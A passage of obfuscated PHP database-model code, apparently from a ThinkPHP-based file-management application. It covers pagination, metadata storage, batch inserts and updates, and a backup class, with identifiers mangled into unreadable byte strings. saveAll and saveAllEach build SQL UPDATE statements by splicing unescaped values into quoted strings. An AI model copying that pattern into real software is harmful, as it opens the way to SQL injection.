5 ? 5 : ($­×Ïé¾Ô >= $¿€‡æŒ ? $¿€‡æŒ : $­×Ïé¾Ô); $–ÍÆêçö = intval(isset($in[$ä×ı¸Áé[353]]) && $in[$ä×ı¸Áé[353]] ? $in[$ä×ı¸Áé[353]] : $–ÍÆêçö); $–ÍÆêçö = $–ÍÆêçö <= 1 ? 1 : $–ÍÆêçö; $­‚öàï = array(); $Ì€Œ×»• = 1; if ($–ÍÆêçö == 1 && $Ì€Œ×»•) { $this->optionsValue($„‚×ñÙ); $­‚öàï = $this->page($–ÍÆêçö, $­×Ïé¾Ô)->select(); $Ü–Æ×ˆË = is_array($­‚öàï) ? count($­‚öàï) : 0; if ($Ü–Æ×ˆË < $­×Ïé¾Ô) { $êöŸ¡×³ = 1; } else { $this->optionsValue($¨‹á„); $Ü–Æ×ˆË = intval($this->count()); $êöŸ¡×³ = ceil($Ü–Æ×ˆË / $­×Ïé¾Ô); } } else { $this->optionsValue($¨‹á„); $Ü–Æ×ˆË = intval($this->count()); $êöŸ¡×³ = ceil($Ü–Æ×ˆË / $­×Ïé¾Ô); $–ÍÆêçö = $–ÍÆêçö >= $êöŸ¡×³ ? $êöŸ¡×³ : $–ÍÆêçö; $this->optionsValue($„‚×ñÙ); $­‚öàï = $this->page($–ÍÆêçö, $­×Ïé¾Ô)->select(); } if (!is_array($­‚öàï)) { $­‚öàï = array(); } if ($êöŸ¡×³ == 1) { $Ü–Æ×ˆË = count($­‚öàï); } $¼¢Ü²å = array($ä×ı¸Áé[366] => array($ä×ı¸Áé[367] => $Ü–Æ×ˆË, $ä×ı¸Áé[363] => $­×Ïé¾Ô, $ä×ı¸Áé[353] => $–ÍÆêçö, $ä×ı¸Áé[368] => $êöŸ¡×³), $ä×ı¸Áé[369] => $­‚öàï); return $¼¢Ü²å; } protected function checkLength($‰Üìù, $×öûÇ¹Á = 0, $âÍÇÅš¶ = '') { $«Á‰ÎÜë =& $_SERVER[­á Ş³Ö]; $×öûÇ¹Á = $×öûÇ¹Á ? $×öûÇ¹Á : 65536; if (!$‰Üìù || strlen($‰Üìù) < $×öûÇ¹Á) { return; } $âÍÇÅš¶ = $âÍÇÅš¶ ? $âÍÇÅš¶ . $«Á‰ÎÜë[71] : $«Á‰ÎÜë[12]; show_json($âÍÇÅš¶ . LNG($«Á‰ÎÜë[370]) . "\x28{$×öûÇ¹Á}\51", !1); } protected function metaSet($ûŒö”ö‡, $ÈÊÎ–æ = null, $Å£Ò®µÒ = null) { $‡¡¡µö– =& $_SERVER[­á Ş³Ö]; if (!$this->tableMeta || !$ûŒö”ö‡) { return !1; } $ì‡”œôµ = $this->tableMeta[$‡¡¡µö–[371]]; $Ş¤€‰Ì¯ = $this->tableMeta[$‡¡¡µö–[372]]; $‹ŒºÏÓÔ = Model($Ş¤€‰Ì¯); $œ˜ãí‰Œ = array($ì‡”œôµ => $ûŒö”ö‡, $‡¡¡µö–[373] => $ÈÊÎ–æ); if (is_null($ÈÊÎ–æ)) { return $‹ŒºÏÓÔ->where(array($ì‡”œôµ => $ûŒö”ö‡))->delete(); } if (is_null($Å£Ò®µÒ) && is_string($ÈÊÎ–æ)) { return $‹ŒºÏÓÔ->where($œ˜ãí‰Œ)->delete(); } $í¦¨öâë = is_array($ÈÊÎ–æ) ? $ÈÊÎ–æ : array(); if (is_string($ÈÊÎ–æ)) { $í¦¨öâë[$ÈÊÎ–æ] = $Å£Ò®µÒ; } $­„×’ÉÙ = array(); foreach ($í¦¨öâë as $§ƒúğ¸í => $¬ üñ®) { if (is_null($¬ üñ®) && is_string($§ƒúğ¸í)) { $‹ŒºÏÓÔ->where(array($ì‡”œôµ => $ûŒö”ö‡, $‡¡¡µö–[373] => $§ƒúğ¸í))->delete(); continue; } $this->checkLength($¬ üñ®, !1, $Ş¤€‰Ì¯ . $‡¡¡µö–[4] . $§ƒúğ¸í); $­„×’ÉÙ[] = array($ì‡”œôµ => $ûŒö”ö‡, $‡¡¡µö–[94] => $§ƒúğ¸í, $‡¡¡µö–[374] => $¬ üñ®); } $°¯¼ç‹™ = $‡¡¡µö–[375] . $Ş¤€‰Ì¯; CacheLock::lock($°¯¼ç‹™); $‹ŒºÏÓÔ->where(array($ì‡”œôµ => $ûŒö”ö‡))->addAll($­„×’ÉÙ, array(), !0); CacheLock::unlock($°¯¼ç‹™); return !0; } public function metaGet($‹ëàœµ, $Š™Óˆ´§ = false) { $¬Ùøà¥¥ =& $_SERVER[­á Ş³Ö]; if (!$this->tableMeta) { return array(); } $ºËø¹® = $this->tableMeta[$¬Ùøà¥¥[371]]; $·ì¯éÓá = Model($this->tableMeta[$¬Ùøà¥¥[372]]); if ($Š™Óˆ´§) { $ Ÿ‚ò = array($ºËø¹® => $‹ëàœµ, $¬Ùøà¥¥[94] => $Š™Óˆ´§); return $·ì¯éÓá->where($ Ÿ‚ò)->getField($¬Ùøà¥¥[374]); } $ Ÿ‚ò = array($ºËø¹® => $‹ëàœµ); $®´áã‰» = $·ì¯éÓá->field($¬Ùøà¥¥[376])->where($ Ÿ‚ò)->select(); $®´áã‰» = array_to_keyvalue($®´áã‰», $¬Ùøà¥¥[94], $¬Ùøà¥¥[374]); return $®´áã‰»; } private function checkDataAutoHas($Å·€øó¼) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $§¸¸‘Å„) { if (in_array($Å·€øó¼, explode($_SERVER[­á Ş³Ö][50], $§¸¸‘Å„[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$Õµ“çõ, $°ß±Ğøé) { $üêëÛŠ =& $_SERVER[­á Ş³Ö]; if (!is_array($Õµ“çõ)) { return; } foreach ($this->dataAuto as $§‡¦œÎ¥) { $ˆ·ô¬ = $§‡¦œÎ¥[0]; if (!in_array($°ß±Ğøé, explode($üêëÛŠ[50], $§‡¦œÎ¥[2]))) { continue; } switch (trim($§‡¦œÎ¥[3])) { case $üêëÛŠ[321]: case $üêëÛŠ[322]: $šÆ–®¨Ú = $§‡¦œÎ¥[1]; $İÜ ĞµÅ = isset($§‡¦œÎ¥[4]) ? (array) $§‡¦œÎ¥[4] : array(); if ($šÆ–®¨Ú == $üêëÛŠ[180] && array_key_exists($ˆ·ô¬, $Õµ“çõ)) { if (!$Õµ“çõ[$ˆ·ô¬]) { unset($Õµ“çõ[$ˆ·ô¬]); } break; } if (isset($Õµ“çõ[$ˆ·ô¬])) { array_unshift($İÜ ĞµÅ, $Õµ“çõ[$ˆ·ô¬]); } if ($üêëÛŠ[321] == $§‡¦œÎ¥[3]) { $Õµ“çõ[$ˆ·ô¬] = call_user_func_array($šÆ–®¨Ú, $İÜ ĞµÅ); } else { $Õµ“çõ[$ˆ·ô¬] = call_user_func_array(array(&$this, $šÆ–®¨Ú), $İÜ ĞµÅ); } break; case $üêëÛŠ[270]: if (isset($Õµ“çõ[$ˆ·ô¬]) && $Õµ“çõ[$ˆ·ô¬]) { $Õµ“çõ[$ˆ·ô¬] = call_user_func_array(array(&$this, $§‡¦œÎ¥[1]), array($Õµ“çõ[$ˆ·ô¬])); } break; case $üêëÛŠ[273]: $Õµ“çõ[$ˆ·ô¬] = $Õµ“çõ[$§‡¦œÎ¥[1]]; break; case $üêëÛŠ[294]: if (isset($Õµ“çõ[$ˆ·ô¬]) && !is_string($Õµ“çõ[$ˆ·ô¬])) { $Õµ“çõ[$ˆ·ô¬] = json_encode_force($Õµ“çõ[$ˆ·ô¬]); } break; case $üêëÛŠ[323]: if ($Õµ“çõ[$ˆ·ô¬] === $üêëÛŠ[12]) { unset($Õµ“çõ[$ˆ·ô¬]); } break; case $üêëÛŠ[324]: $Õµ“çõ[$ˆ·ô¬] = $§‡¦œÎ¥[1]; default: break; } } if ($°ß±Ğøé == $üêëÛŠ[355]) { $µâ¶½Ú = strtolower($this->db->getDbType()); if (strpos($µâ¶½Ú, $üêëÛŠ[13]) !== 0) { return; } $²ñÆ¼É» = $this->field(!0)->fields; $ŒòàÌ³ü = $²ñÆ¼É»[$üêëÛŠ[252]]; if (isset($²ñÆ¼É»[$üêëÛŠ[251]])) { unset($ŒòàÌ³ü[$²ñÆ¼É»[$üêëÛŠ[251]]]); } foreach ($ŒòàÌ³ü as $É€ÈÂæ => $°ß±Ğøé) { if (!isset($Õµ“çõ[$É€ÈÂæ])) { $Õµ“çõ[$É€ÈÂæ] = $üêëÛŠ[12]; } } } } private function dataAfterFilter(&$¥¶ßƒış) { $ÀÙÊÈ‚À =& $_SERVER[­á Ş³Ö]; foreach ($this->dataAuto as $¥¯ŒçœÀ) { $ÔûŸéğƒ = $¥¯ŒçœÀ[0]; if (!isset($¥¶ßƒış[$ÔûŸéğƒ])) { continue; } if (!in_array($ÀÙÊÈ‚À[357], explode($ÀÙÊÈ‚À[50], $¥¯ŒçœÀ[2]))) { continue; } switch (trim($¥¯ŒçœÀ[3])) { case $ÀÙÊÈ‚À[321]: case $ÀÙÊÈ‚À[322]: $É¿€ë÷Ò = isset($¥¯ŒçœÀ[4]) ? (array) $¥¯ŒçœÀ[4] : array(); array_unshift($É¿€ë÷Ò, $¥¶ßƒış[$ÔûŸéğƒ]); if (isset($¥¯ŒçœÀ[4]) && $¥¯ŒçœÀ[4] == $ÀÙÊÈ‚À[377]) { $É¿€ë÷Ò = array($¥¶ßƒış[$ÔûŸéğƒ]); } if ($ÀÙÊÈ‚À[321] == $¥¯ŒçœÀ[3]) { $¥¶ßƒış[$ÔûŸéğƒ] = call_user_func_array($¥¯ŒçœÀ[1], $É¿€ë÷Ò); } else { $¥¶ßƒış[$ÔûŸéğƒ] = call_user_func_array(array(&$this, $¥¯ŒçœÀ[1]), $É¿€ë÷Ò); } break; case $ÀÙÊÈ‚À[270]: if (isset($¥¶ßƒış[$ÔûŸéğƒ]) && $¥¶ßƒış[$ÔûŸéğƒ]) { $¥¶ßƒış[$ÔûŸéğƒ] = call_user_func_array(array(&$this, $¥¯ŒçœÀ[1]), array($¥¶ßƒış[$ÔûŸéğƒ])); } break; case $ÀÙÊÈ‚À[273]: $¥¶ßƒış[$ÔûŸéğƒ] = $¥¶ßƒış[$¥¯ŒçœÀ[1]]; break; case $ÀÙÊÈ‚À[294]: $‡¯èÏ”Î = $¥¶ßƒış[$ÔûŸéğƒ]; $¥¶ßƒış[$ÔûŸéğƒ] = json_decode($‡¯èÏ”Î, !0); if (is_null($¥¶ßƒış[$ÔûŸéğƒ])) { $¥¶ßƒış[$ÔûŸéğƒ] = $‡¯èÏ”Î; } break; case $ÀÙÊÈ‚À[323]: if ($¥¶ßƒış[$ÔûŸéğƒ] === $ÀÙÊÈ‚À[12]) { unset($¥¶ßƒış[$ÔûŸéğƒ]); } break; case $ÀÙÊÈ‚À[324]: $¥¶ßƒış[$ÔûŸéğƒ] = $¥¯ŒçœÀ[1]; break; default: break; } } } public function saveAll($ØÓ‹Åü§) { $ıçœ…ş =& $_SERVER[­á Ş³Ö]; $ûİ™Ñ·º = $this->tablePrefix . $this->tableName; $•ûÉ¿ë = self::SQL_WHERE_IN_CHUNK; $ØÓ‹Åü§ = is_array($ØÓ‹Åü§) ? $ØÓ‹Åü§ : array(); $¢©ÚÚŸ® = $ıçœ…ş[378]; $‘ˆ‡çÎô = 0; $¼¶°­›ú = array(); $ş¥³øç = count($ØÓ‹Åü§); for ($éäº˜è˜ = 0; $éäº˜è˜ < $ş¥³øç; $éäº˜è˜++) { $ûì‘èËİ = $ØÓ‹Åü§[$éäº˜è˜]; if (!is_array($ûì‘èËİ) || count($ûì‘èËİ) != 4) { continue; } $€Ê•¾Î = "\x55\120\x44\101\x54\x45\40\140{$ûİ™Ñ·º}\x60\x20\x53\105\x54\40{$ûì‘èËİ[2]}\40\75\40\103\x41\123\x45\x20{$ûì‘èËİ[0]}\x20\12"; if ($‘ˆ‡çÎô == 0) { $¢©ÚÚŸ® = $€Ê•¾Î; } $¼¶°­›ú[] = $ıçœ…ş[118] . $ûì‘èËİ[1] . $ıçœ…ş[118]; $‘ˆ‡çÎô++; $¢©ÚÚŸ® .= "\40\x57\110\x45\x4e\40\47{$ûì‘èËİ[1]}\47\40\124\110\x45\116\40\47{$ûì‘èËİ[3]}\47\40\xa"; if ($‘ˆ‡çÎô == $•ûÉ¿ë || $éäº˜è˜ == $ş¥³øç - 1) { $Òº»‘¯õ = implode($ıçœ…ş[50], $¼¶°­›ú); $¢©ÚÚŸ® .= "\x20\105\x4e\x44\40\x20\x57\x48\105\122\105\x20{$ûì‘èËİ[0]}\40\x49\116\40\x28{$Òº»‘¯õ}\x29\x20"; $this->execute($¢©ÚÚŸ®); $‘ˆ‡çÎô = 0; $¢©ÚÚŸ® = $€Ê•¾Î; $this->chunkEventCheck(count($¼¶°­›ú)); $¼¶°­›ú = array(); } } $this->chunkEventSet(); } public function saveAllEach($Ç‰ª´¥¡) { $É³»§îş =& $_SERVER[­á Ş³Ö]; $¦²Â–‹Û = $this->tablePrefix . $this->tableName; foreach ($Ç‰ª´¥¡ as $²œÀ’ßê) { if (!is_array($²œÀ’ßê) || count($²œÀ’ßê) != 4) { continue; } $éóäÂÅ‘ = $²œÀ’ßê[0] . $É³»§îş[379] . $²œÀ’ßê[1] . $É³»§îş[118]; $ƒÆøØã¼ = $²œÀ’ßê[2] . $É³»§îş[379] . $²œÀ’ßê[3] . $É³»§îş[118]; $ëí×ÅµŒ = "\165\160\144\141\x74\x65\40{$¦²Â–‹Û}\40\x73\x65\x74\x20{$ƒÆøØã¼}\x20\167\x68\145\x72\x65\40{$éóäÂÅ‘}\x3b"; $this->execute($ëí×ÅµŒ); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($„¸úİô³ = false, $‹°–Úø¸ = false) { $this->_chunkEvent = $„¸úİô³; $this->_chunkEventParam = $‹°–Úø¸; } private function chunkEventCheck($×‡ş·É¬) { if (!$this->_chunkEvent) { return; } $“–ÜØÚº = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $“–ÜØÚº[$_SERVER[­á Ş³Ö][380]] = $×‡ş·É¬; Hook::trigger($this->_chunkEvent, $“–ÜØÚº); } public function addAll($õª’˜Şµ, $ÊÒƒÖúè = array(), $£÷³…ı = false) { $’¦ëñºÍ =& $_SERVER[­á Ş³Ö]; ignore_timeout(); $˜ğç˜© = self::SQL_WHERE_IN_CHUNK; if (empty($õª’˜Şµ)) { $this->error = think_lang($’¦ëñºÍ[271]); return !1; } $ÊÒƒÖúè = $this->_parseOptions($ÊÒƒÖúè); foreach ($õª’˜Şµ as $„Ó„³ş€ => $ûŒ –ƒ£) { $õª’˜Şµ[$„Ó„³ş€] = $this->_facade($ûŒ –ƒ£); $this->_beforeInsert($õª’˜Şµ[$„Ó„³ş€], $ÊÒƒÖúè); } if (method_exists($this->db, $’¦ëñºÍ[272])) { for ($”ÎÚ¥« = 0; $”ÎÚ¥« < count($õª’˜Şµ); $”ÎÚ¥« += $˜ğç˜©) { $£²¡¯… = array_slice($õª’˜Şµ, $”ÎÚ¥«, $˜ğç˜©); if (!is_array($£²¡¯…) || count($£²¡¯…) == 0) { break; } $»ïì¡Š = $this->db->insertAll($£²¡¯…, $ÊÒƒÖúè, $£÷³…ı); $this->chunkEventCheck(count($£²¡¯…)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($õª’˜Şµ as $„Ó„³ş€ => $ûŒ –ƒ£) { $»ïì¡Š = $this->db->insert($ûŒ –ƒ£, $ÊÒƒÖúè, $£÷³…ı); } $this->commit(); } if (!1 !== $»ïì¡Š) { $ŒâĞÀ¦ = $this->getLastInsID(); if ($ŒâĞÀ¦) { return $ŒâĞÀ¦; } } return $»ïì¡Š; } public function save($ë¥§İùÕ = '', $©‰ü’¨¶ = array()) { $·ÕÊ»ëÈ =& $_SERVER[­á Ş³Ö]; $™óìŸÛŸ = self::SQL_WHERE_IN_CHUNK; $ìØ—›ôû = $this->optionsValue(); $òá¦öÌã = $this->findWhereField($ìØ—›ôû); if (!$òá¦öÌã) { return parent::save($ë¥§İùÕ, $©‰ü’¨¶); } $óÓ×ŠşÙ = 0; $¸šÀÆ¡ä = $ìØ—›ôû[$·ÕÊ»ëÈ[275]][$òá¦öÌã][1]; $¸šÀÆ¡ä = is_array($¸šÀÆ¡ä) ? $¸šÀÆ¡ä : array(); $‰Õõ•Ä¥ = count($¸šÀÆ¡ä); for ($—®Ä”¯§ = 0; $—®Ä”¯§ < $‰Õõ•Ä¥; $—®Ä”¯§ += $™óìŸÛŸ) { $¢ŞìŸÍ = array_slice($¸šÀÆ¡ä, $—®Ä”¯§, $™óìŸÛŸ); if (!is_array($¢ŞìŸÍ) || count($¢ŞìŸÍ) == 0) { break; } $ìØ—›ôû[$·ÕÊ»ëÈ[275]][$òá¦öÌã][1] = $¢ŞìŸÍ; $this->optionsValue($ìØ—›ôû); $óÓ×ŠşÙ += parent::save($ë¥§İùÕ, $©‰ü’¨¶); $this->chunkEventCheck(count($¢ŞìŸÍ)); } $this->chunkEventSet(); return $óÓ×ŠşÙ; } public function add($Ïîò„› = '', $«ÙÕ…ßÃ = array(), $ÛáâÜòº = false) { if ($this->addTaskStatus && is_array($Ïîò„›)) { $this->addTaskData[] = $Ïîò„›; return; } return parent::add($Ïîò„›, $«ÙÕ…ßÃ, $ÛáâÜòº); } public function parseWhereLike($È”Œæüç, $¨ÙÄùÁğ = '', $í›»¨ğ = false, &$”õ¶İÓ® = false) { $Ä­ºÄ¢ê =& $_SERVER[­á Ş³Ö]; $ •¸£Ê• = $GLOBALS[$Ä­ºÄ¢ê[6]][$Ä­ºÄ¢ê[381]]; if (!$ •¸£Ê•[$Ä­ºÄ¢ê[382]]) { return $È”Œæüç; } if (!is_array($È”Œæüç)) { return $È”Œæüç; } $ôŠ‘ÃÊ¦ = array(); $òƒ»ßÅŠ = 0; foreach ($È”Œæüç as $©İãÕÕé => $è¢Ø¢îò) { if (is_array($è¢Ø¢îò) && count($è¢Ø¢îò) == 2 && $è¢Ø¢îò[0] == $Ä­ºÄ¢ê[383] && is_string($è¢Ø¢îò[1]) && substr($è¢Ø¢îò[1], 0, 1) == $Ä­ºÄ¢ê[384] && substr($è¢Ø¢îò[1], strlen($è¢Ø¢îò[1]) - 1, 1) == $Ä­ºÄ¢ê[384]) { $”õ¶İÓ® = !0; $ÓŸ®ŠæÅ = is_string($©İãÕÕé) ? $©İãÕÕé : $¨ÙÄùÁğ; $µ¾«Ø‘µ = substr($è¢Ø¢îò[1], 1, strlen($è¢Ø¢îò[1]) - 2); $µ¾«Ø‘µ = $this->db->escapeString($µ¾«Ø‘µ); if (!strpos($ÓŸ®ŠæÅ, $Ä­ºÄ¢ê[10])) { $ÓŸ®ŠæÅ = $Ä­ºÄ¢ê[385] . $ÓŸ®ŠæÅ . $Ä­ºÄ¢ê[385]; } $ªÍ·¾Š = $Ä­ºÄ¢ê[189] . $µ¾«Ø‘µ . $Ä­ºÄ¢ê[189]; $µ¾«Ø‘µ = str_replace(array($Ä­ºÄ¢ê[10], $Ä­ºÄ¢ê[386], $Ä­ºÄ¢ê[11]), $Ä­ºÄ¢ê[387], $µ¾«Ø‘µ); if ($ •¸£Ê•[$Ä­ºÄ¢ê[388]]) { $ªÍ·¾Š = $Ä­ºÄ¢ê[389] . $µ¾«Ø‘µ . $Ä­ºÄ¢ê[390]; if ($ •¸£Ê•[$Ä­ºÄ¢ê[391]]) { $ªÍ·¾Š = $Ä­ºÄ¢ê[390] . $µ¾«Ø‘µ . $Ä­ºÄ¢ê[389]; } } $ôŠ‘ÃÊ¦[$òƒ»ßÅŠ] = $Ä­ºÄ¢ê[392] . $ÓŸ®ŠæÅ . $Ä­ºÄ¢ê[393] . $ªÍ·¾Š . $Ä­ºÄ¢ê[394]; $òƒ»ßÅŠ++; continue; } if (is_array($è¢Ø¢îò)) { $¨ÙÄùÁğ = is_string($©İãÕÕé) ? $©İãÕÕé : $¨ÙÄùÁğ; $è¢Ø¢îò = $this->parseWhereLike($è¢Ø¢îò, $¨ÙÄùÁğ, !0, $”õ¶İÓ®); } if (is_numeric($©İãÕÕé)) { $ôŠ‘ÃÊ¦[$òƒ»ßÅŠ] = $è¢Ø¢îò; $òƒ»ßÅŠ++; } else { $ôŠ‘ÃÊ¦[$©İãÕÕé] = $è¢Ø¢îò; } } if ($”õ¶İÓ® && !$í›»¨ğ) { } return $ôŠ‘ÃÊ¦; } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($ú€·Æü÷ = array()) { $ìÏ˜ö—Å =& $_SERVER[­á Ş³Ö]; $“‚ÛçÙ = self::SQL_WHERE_IN_CHUNK; $õÑè„Èå = $this->optionsValue(); $€•Øûã = $this->findWhereField($õÑè„Èå); if (!$€•Øûã || isset($õÑè„Èå[$ìÏ˜ö—Å[292]]) || isset($õÑè„Èå[$ìÏ˜ö—Å[353]])) { return parent::select($ú€·Æü÷); } $Õ‰×ê¥± = $õÑè„Èå[$ìÏ˜ö—Å[275]][$€•Øûã][1]; $Õ‰×ê¥± = is_array($Õ‰×ê¥±) ? $Õ‰×ê¥± : array(); $ÑÉÒ×ı = null; for ($«ÄôÄœ = 0; $«ÄôÄœ < count($Õ‰×ê¥±); $«ÄôÄœ += $“‚ÛçÙ) { $ÔøíûÂ¬ = array_slice($Õ‰×ê¥±, $«ÄôÄœ, $“‚ÛçÙ); if (!is_array($ÔøíûÂ¬) || count($ÔøíûÂ¬) == 0) { break; } $õÑè„Èå[$ìÏ˜ö—Å[275]][$€•Øûã][1] = $ÔøíûÂ¬; $this->optionsValue($õÑè„Èå); $“Í¹‚Ş“ = parent::select($ú€·Æü÷); if (!$“Í¹‚Ş“) { continue; } $ÑÉÒ×ı = is_array($ÑÉÒ×ı) ? $ÑÉÒ×ı : array(); $ÑÉÒ×ı = array_merge($ÑÉÒ×ı, $“Í¹‚Ş“); } return $ÑÉÒ×ı; } public function delete($Š­î„‘ê = array()) { $Ôéãı…ò =& $_SERVER[­á Ş³Ö]; $ËßÊ¯¤„ = self::SQL_WHERE_IN_CHUNK; $„ÊñÓˆ = $this->optionsValue(); $µ°ßµş = $this->findWhereField($„ÊñÓˆ); if (!$µ°ßµş) { return parent::delete($Š­î„‘ê); } $ä‡óÁçú = 0; $ü‚¢©Í© = $„ÊñÓˆ[$Ôéãı…ò[275]][$µ°ßµş][1]; $ü‚¢©Í© = is_array($ü‚¢©Í©) ? $ü‚¢©Í© : array(); for ($ ı¤‹åÀ = 0; $ ı¤‹åÀ < count($ü‚¢©Í©); $ ı¤‹åÀ += $ËßÊ¯¤„) { $“ÓÕÓı½ = array_slice($ü‚¢©Í©, $ ı¤‹åÀ, $ËßÊ¯¤„); if (!is_array($“ÓÕÓı½) || count($“ÓÕÓı½) == 0) { break; } $„ÊñÓˆ[$Ôéãı…ò[275]][$µ°ßµş][1] = $“ÓÕÓı½; $this->optionsValue($„ÊñÓˆ); $ä‡óÁçú += parent::delete($Š­î„‘ê); } return $ä‡óÁçú; } private function findWhereField($ËÓÅ”Ø‚) { $ÊôÆ–¤˜ =& $_SERVER[­á Ş³Ö]; $Ô¸À¶°ô = self::SQL_WHERE_IN_CHUNK; if (!is_array($ËÓÅ”Ø‚) || !is_array($ËÓÅ”Ø‚[$ÊôÆ–¤˜[275]])) { return !1; } foreach ($ËÓÅ”Ø‚[$ÊôÆ–¤˜[275]] as $ï¸‹¼¨š => $†éØû’Õ) { if (is_array($†éØû’Õ) && isset($†éØû’Õ[0]) && is_string($†éØû’Õ[0]) && strtolower($†éØû’Õ[0]) == $ÊôÆ–¤˜[7] && is_array($†éØû’Õ[1]) && count($†éØû’Õ[1]) > $Ô¸À¶°ô) { ignore_timeout(); return $ï¸‹¼¨š; } } return !1; } public function setMasterDB($¶£‘»ºº = true) { think_config($_SERVER[­á Ş³Ö][395], $¶£‘»ºº); } } class ModelBaseLight { public $optionType = ''; public $modelType = "\123\171\163\x74\145\x6d\x4f\160\164\151\x6f\x6e"; public $field = array(); public function listData($ĞÜêçØ = false, $•™Â¾óã = "\x6d\157\x64\x69\x66\171\x54\151\x6d\x65", $ïÛÎËÅº = false) { $îø±ÓØœ = Model($this->modelType)->get(!1, $this->optionType, !0); $¬²ÅšÓÖ = array_values($îø±ÓØœ); if ($¬²ÅšÓÖ && $¬²ÅšÓÖ[0] && !is_array($¬²ÅšÓÖ[0])) { Model($this->modelType)->cacheRemove($this->optionType); $îø±ÓØœ = Model($this->modelType)->get(!1, $this->optionType, !0); } if (!$îø±ÓØœ) { return $ĞÜêçØ ? null : array(); } if (!$ĞÜêçØ) { $îø±ÓØœ = array_filter(array_values($îø±ÓØœ)); return array_sort_by($îø±ÓØœ, $•™Â¾óã, $ïÛÎËÅº); } return $îø±ÓØœ[$_SERVER[­á Ş³Ö][396] . $ĞÜêçØ]; } public function insert($—˜©üÙò) { $¶™õûùŒ =& $_SERVER[­á Ş³Ö]; $—˜©üÙò = array_field_key($—˜©üÙò, $this->field); $“ó¸“€Ÿ = Model($this->modelType)->get($¶™õûùŒ[397], $this->optionType . $¶™õûùŒ[398]); $“ó¸“€Ÿ = $“ó¸“€Ÿ ? $“ó¸“€Ÿ : 0; $—˜©üÙò[$¶™õûùŒ[399]] = ++$“ó¸“€Ÿ; $—˜©üÙò[$¶™õûùŒ[201]] = time(); $—˜©üÙò[$¶™õûùŒ[85]] = time(); Model($this->modelType)->set($¶™õûùŒ[397], $“ó¸“€Ÿ, $this->optionType . $¶™õûùŒ[398]); Model($this->modelType)->set($¶™õûùŒ[396] . $“ó¸“€Ÿ, $—˜©üÙò, $this->optionType); return $“ó¸“€Ÿ; } public function update($•‹‡—‰, $šğ”Ê–º) { $èË²•áš =& $_SERVER[­á Ş³Ö]; $šğ”Ê–º = array_field_key($šğ”Ê–º, $this->field); $ùìˆÙĞá = $this->listData($•‹‡—‰); if (!$ùìˆÙĞá || !$•‹‡—‰) { return !1; } $šğ”Ê–º = array_merge($ùìˆÙĞá, $šğ”Ê–º); $šğ”Ê–º[$èË²•áš[85]] = time(); return Model($this->modelType)->set($èË²•áš[396] . $•‹‡—‰, $šğ”Ê–º, $this->optionType); } public function remove($Ş›Ï†Š‚) { if (!$Ş›Ï†Š‚) { return !1; } return Model($this->modelType)->remove($_SERVER[­á Ş³Ö][396] . $Ş›Ï†Š‚, $this->optionType); } public function clear() { $óÕÏ¢øã =& $_SERVER[­á Ş³Ö]; Model($this->modelType)->remove($óÕÏ¢øã[397], $this->optionType . $óÕÏ¢øã[398]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($ÒµÑÆ‘Û, $‡â§˜¦¾) { if (!$‡â§˜¦¾) { return !1; } $ë¢“Øö† = $this->listData(); $ë¢“Øö† = array_to_keyvalue($ë¢“Øö†, $ÒµÑÆ‘Û); return isset($ë¢“Øö†[$‡â§˜¦¾]) ? $ë¢“Øö†[$‡â§˜¦¾] : !1; } public function findByName($íñ¬•´ß) { return $this->findByKey($_SERVER[­á Ş³Ö][32], $íñ¬•´ß); } protected function resetData($ü½ğåĞÌ) { $·İŸ³¹î =& $_SERVER[­á Ş³Ö]; $ü½ğåĞÌ = is_array($ü½ğåĞÌ) ? $ü½ğåĞÌ : array(); $ØŸÚÓåœ = array(); for ($¤ÓûÖàí = 0; $¤ÓûÖàí < count($ü½ğåĞÌ); $¤ÓûÖàí++) { $ØŸÚÓåœ[$·İŸ³¹î[396] . $ü½ğåĞÌ[$¤ÓûÖàí][$·İŸ³¹î[399]]] = $ü½ğåĞÌ[$¤ÓûÖàí]; } return Model($this->modelType)->set($ØŸÚÓåœ, !1, $this->optionType); } private function getAutoName($ªÅ¨íÚ) { $›ñ©æİ = array_to_keyvalue($this->listData(), $_SERVER[­á Ş³Ö][32]); if (!$›ñ©æİ || !isset($›ñ©æİ[$ªÅ¨íÚ])) { return $ªÅ¨íÚ; } for ($½İÕôõı = 1; $½İÕôõı < count($›ñ©æİ); $½İÕôõı++) { $Ê¹©âï· = $ªÅ¨íÚ . "\50{$½İÕôõı}\51"; if (!isset($›ñ©æİ[$Ê¹©âï·])) { return $Ê¹©âï·; } } return $Ê¹©âï·; } } goto bô¤Ş¤„ß; A¹§ŸÑ”˜: class Backup { protected static $name; protected static $option; protected static $manual; public function __construct() { $this->init(); $this->keep(); } public function init() { $Øˆ‚¼êİ =& $_SERVER[­á Ş³Ö]; $this->isManual(); self::$name = date($Øˆ‚¼êİ[744]); if (!($àå·½™ = Model($Øˆ‚¼êİ[745])->lastItem())) { $àå·½™ = $this->initData(); } else { self::$name = $àå·½™[$Øˆ‚¼êİ[32]]; if ($àå·½™[$Øˆ‚¼êİ[746]] == $Øˆ‚¼êİ[88]) { self::$name = date($Øˆ‚¼êİ[747]); $õı§¼Ò = 0; if (isset($àå·½™[$Øˆ‚¼êİ[293]][$Øˆ‚¼êİ[200]][$Øˆ‚¼êİ[468]])) { $õı§¼Ò = (int) $àå·½™[$Øˆ‚¼êİ[293]][$Øˆ‚¼êİ[200]][$Øˆ‚¼êİ[468]]; } if (self::$manual == 0 && $àå·½™[$Øˆ‚¼êİ[32]] == self::$name) { Model($Øˆ‚¼êİ[745])->remove($àå·½™[$Øˆ‚¼êİ[399]]); } $àå·½™ = $this->initData($õı§¼Ò, $àå·½™[$Øˆ‚¼êİ[748]]); } else { $this->checkStore($àå·½™[$Øˆ‚¼êİ[748]]); } } self::$option = $àå·½™; } private function isManual() { $ƒŸšĞˆ = _get($GLOBALS, $_SERVER[­á Ş³Ö][749], 0); $ƒŸšĞˆ = 